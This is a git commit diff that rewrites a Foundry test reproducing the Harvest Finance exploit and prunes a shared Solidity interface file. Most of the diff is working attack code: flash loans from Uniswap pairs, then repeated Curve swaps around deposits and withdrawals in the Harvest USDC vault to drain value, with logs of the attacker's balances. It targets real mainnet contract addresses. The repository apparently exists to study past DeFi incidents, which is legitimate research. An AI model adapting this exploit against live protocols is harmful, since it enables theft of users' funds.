2b62e161778689e60023ca2d97ef515489ff6fa5
SunWeb3Sec <107249780+SunWeb3Sec@users.noreply.github.com>
2022-06-19 17:24:41 +0800

    Fix HarvestFinance

--- src/test/HarvestFinance_exp.sol
+++ src/test/HarvestFinance_exp.sol
@@ -4,85 +4,86 @@ pragma solidity 0.8.10;
 import "ds-test/test.sol";
 import "./interface.sol";
 
-interface IFarm {
-    function withdraw(uint256 _amount) external returns (uint256);
-    function deposit(uint256 _amount) external returns (uint256);
-}
-
-interface ICurve {
-    function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
-}
 
 contract ContractTest is DSTest {
-    CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-    address USDT_WETH = 0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852;
-    address USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
-    address USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
-    address ySwap = 0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51;
-    address fUSDT = 0x053c80eA73Dc6941F518a68E2FC52Ac45BDE7c9C;
+  CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
+  // CONTRACTS
+  // Uniswap ETH/USDC LP (UNI-V2)
+  IUniswapV2Pair usdcPair = IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);
+  // Uniswap ETH/USDT LP (UNI-V2)
+  IUniswapV2Pair usdtPair = IUniswapV2Pair(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);
+  // Curve y swap
+  IcurveYSwap curveYSwap = IcurveYSwap(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51);
+  // Harvest USDC pool
+  IHarvestUsdcVault harvest = IHarvestUsdcVault(0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE);
 
+  // ERC20s
+  // 6 decimals on usdt
+  IUSDT usdt = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
+  // 6 decimals on usdc
+  IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
+  // 6 decimals on yusdc
+  IERC20 yusdc = IERC20(0xd6aD7a6750A7593E092a9B218d66C0A814a3436e);
+  // 6 decimals on yusdt
+  IERC20 yusdt = IERC20(0x83f798e925BcD4017Eb265844FDDAbb448f1707D);
+  // 6 decimals on fUSDT
+  IERC20 fusdt = IERC20(0x053c80eA73Dc6941F518a68E2FC52Ac45BDE7c9C);
+  // 6 decimals on fUSDC
+  IERC20 fusdc = IERC20(0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE);
+
+  uint usdcLoan = 50000000*10**6;
+  uint usdcRepayment = (usdcLoan * 100301) / 100000;
+  uint usdtLoan = 17300000*10**6;
+  uint usdtRepayment = (usdtLoan * 100301) / 100000;
+  uint usdcBal;
+  uint usdtBal;
 
     function testExploit() public {
-    cheat.startPrank(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
-    IERC20(USDT).transfer(address(this),234864);
-    IERC20(USDC).transfer(address(this),408038262032);
-    cheat.stopPrank();
-    
-    IUniswapV2Pair(USDT_WETH).swap(
-            0,
-            50_000_000 * 1e6,
-            address(this),
-            abi.encode(1)
-        );
+    usdt.approve(address(curveYSwap), type(uint256).max);
+    usdc.approve(address(curveYSwap), type(uint256).max);
+    usdc.approve(address(harvest), type(uint256).max);
+    usdt.approve(address(usdtPair), type(uint256).max);
+    usdc.approve(address(usdcPair), type(uint256).max);
+    emit log_named_uint("Before exploitation, USDC balance of attacker:", usdc.balanceOf(address(this))/1e6);
+    emit log_named_uint("Before exploitation, USDT balance of attacker:", usdt.balanceOf(address(this))/1e6);
+    usdcPair.swap(usdcLoan, 0, address(this), "0x");
+
+    emit log_named_uint("After exploitation, USDC balance of attacker:", usdc.balanceOf(address(this))/1e6);
+    emit log_named_uint("After exploitation, USDT balance of attacker:", usdt.balanceOf(address(this))/1e6);
     }
 
 
-    function uniswapV2Call(
-        address sender,
-        uint256 amount0,
-        uint256 amount1,
-        bytes calldata data
-    ) external  {
+    function uniswapV2Call(address,uint,uint,bytes calldata) external {
 
-    emit log_named_uint("Amount of USDT received:", IERC20(USDT).balanceOf(address(this)));
-        IERC20(USDT).approve(address(ySwap), 2**256 - 1);
-        IERC20(USDT).approve(address(fUSDT), 2**256 - 1);
-        IERC20(fUSDT).approve(address(fUSDT), 2**256 - 1);
-        IERC20(USDC).approve(address(ySwap), 2**256 - 1);
-
-        for (uint256 i = 0; i < 4; i++) {
-            uint256 usdcAmount = IERC20(USDC).balanceOf(address(this));
-
-            emit log_named_uint("USDC in contract:", usdcAmount);
-            ICurve(ySwap).exchange_underlying(1, 2, usdcAmount, 0);
-
-            emit log_named_uint("USDT balance after swap:", IERC20(USDT).balanceOf(address(this)));
-            uint256 slip = (IERC20(USDT).balanceOf(address(this)) * 5) / 1000;
-
-            IFarm(fUSDT).deposit(IERC20(USDT).balanceOf(address(this)) - slip);
-
-            uint256 fUSDTShares = IERC20(fUSDT).balanceOf(address(this));
-
-            emit log_named_uint("deposited:", fUSDTShares);
-            ICurve(ySwap).exchange_underlying(
-                2,
-                1,
-                IERC20(USDT).balanceOf(address(this)),
-                0
-            );
-
-            IFarm(fUSDT).withdraw(fUSDTShares);
-
-
-    emit log_named_uint("USDC in contract:", usdcAmount);
-    emit log_named_uint("USDT after withdraw", IERC20(USDT).balanceOf(address(this)));
-    emit log_named_uint("USDC after withdraw", IERC20(USDC).balanceOf(address(this)));
-        }
-
-        uint256 returnAmountFee = (amount1 * 1000) / 997 + 1;
-        IERC20(USDT).transfer(USDT_WETH, returnAmountFee);
-    emit log_named_uint("Flashloan Return Amount", returnAmountFee);
-
+    if(msg.sender == address(usdcPair)) {
+      emit log_named_uint("Flashloan, Amount of USDT received:", usdc.balanceOf(address(this))/1e6);
+      usdtPair.swap(0, usdtLoan, address(this), "0x");
+      bool usdcSuccess = usdc.transfer(address(usdcPair), usdcRepayment);
     }
+
+    if(msg.sender == address(usdtPair)) {
+      emit log_named_uint("Flashloan, Amount of USDT received:", usdt.balanceOf(address(this))/1e6);
+      for(uint i = 0; i < 6; i++){
+        theSwap(i);
+        
+      }
+      usdt.transfer(msg.sender, usdtRepayment);
+    }
+
+  }
+
+  function theSwap(uint i) internal {
+
+    curveYSwap.exchange_underlying(2, 1, 17200000*10**6, 17000000*10**6);
+    harvest.deposit(49000000000000);
+    curveYSwap.exchange_underlying(1, 2, 17310000*10**6, 17000000*10**6);
+    harvest.withdraw(fusdc.balanceOf(address(this)));
+    emit log_named_uint("After swap, USDC balance of attacker:", usdc.balanceOf(address(this))/1e6);
+    emit log_named_uint("After swap ,USDT balance of attacker:", usdt.balanceOf(address(this))/1e6);
+
+  }
+
+ 
         receive() external payable {}
+
 }
--- src/test/interface.sol
+++ src/test/interface.sol
@@ -1409,7 +1409,6 @@ interface Surge{
 interface USDT{
     function transfer(address to, uint value) external;
     function balanceOf(address account) external view returns (uint);
-    function approve (address spender, uint256 value) external ;
 }
 interface IMasterChef {
     event Deposit(address indexed user, uint256 indexed pid, uint256 amount);
@@ -3757,44 +3756,30 @@ interface IRouter {
 }
 
 
-interface ILendingPool {
-
-  function flashLoan(
-    address receiverAddress,
-    address[] calldata assets,
-    uint256[] calldata amounts,
-    uint256[] calldata modes,
-    address onBehalfOf,
-    bytes calldata params,
-    uint16 referralCode
-  ) external;
-
+interface IUSDT {
+    function approve(address _spender, uint256 _value) external;
+    function balanceOf(address owner) external view returns (uint);
+    function transfer(address _to, uint256 _value) external;
 }
-interface IAToken{
-    function mintToTreasury(uint256 amount, uint256 index) external;
+
+interface IcurveYSwap {
+    function exchange_underlying(
+        int128 i,
+        int128 j,
+        uint256 dx,
+        uint256 min_dy
+    ) external;
+    // dx is in, dy is out.
+    // 0 is yDAI
+    // 1 is yUSDC
+    // 2 is yUSDT
+    // 3 is yTUSD
+}
+
+interface IHarvestUsdcVault {
+    function deposit(uint256 amountWei) external;
+
+    function withdraw(uint256 numberOfShares) external;
+
     function balanceOf(address account) external view returns (uint256);
-     function approve (address spender, uint256 value) external ;
-}
-interface VyperContract {
-
-    function add_liquidity(uint256[3] calldata amounts, uint256 min_mint_amount) external;
-    function balanceOf(address account) external view returns (uint256);
-    function mint (address account, uint256 value) external ;
-    function approve (address spender, uint256 value) external ;
-    function transferUnderlyingTo(address target, uint256 amount) external returns (uint256);
-    function deposit (uint amounts, address recipient) external returns (uint256);
-    function exchange(address _pool, address _from, address _to, uint256 _amount, uint256 _expected, address _receiver ) external returns (uint256);
-    function remove_liquidity_one_coin(uint256 _token_amount, int128 i, uint256 min_amount) external;
-
-}
-
-
-interface IAggregator {
-    function latestAnswer() external view returns (int256 answer);
-}
-interface CErc20Interface {
-
-   function mint(uint mintAmount) external returns (uint);
-   function balanceOf(address account) external view returns (uint256);
-   function borrow(uint borrowAmount) external returns (uint);
 }
